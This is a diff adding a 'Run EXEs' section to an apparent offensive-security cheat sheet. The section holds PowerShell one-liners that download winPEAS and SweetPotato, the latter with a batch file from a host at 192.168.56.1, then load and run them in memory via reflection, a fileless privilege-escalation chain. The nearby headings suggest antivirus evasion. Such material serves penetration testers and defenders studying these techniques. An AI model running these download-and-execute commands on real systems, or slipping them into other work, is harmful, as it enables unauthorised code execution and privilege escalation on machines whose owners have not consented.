@@ -78,6 +78,21 @@ function Invoke-BloodHound
 }
 ```
 
+### Run EXEs
+
+```powershell
+$data=(New-Object System.Net.WebClient).DownloadData('https://github.com/peass-ng/PEASS-ng/releases/download/20250110-31084f44/winPEASany_ofs.exe');
+$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
+$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
+[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
+# Potato
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8080/runme.bat','c:\temp\runme.bat')
+$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/SweetPotato.exe');
+$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
+$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
+[SweetPotato.Program]::Main(@('-p=C:\temp\runme.bat'));[Console]::SetOut($out);$sWriter.ToString()
+```
+
 
 ## Option 1 (Detected by AV)
 
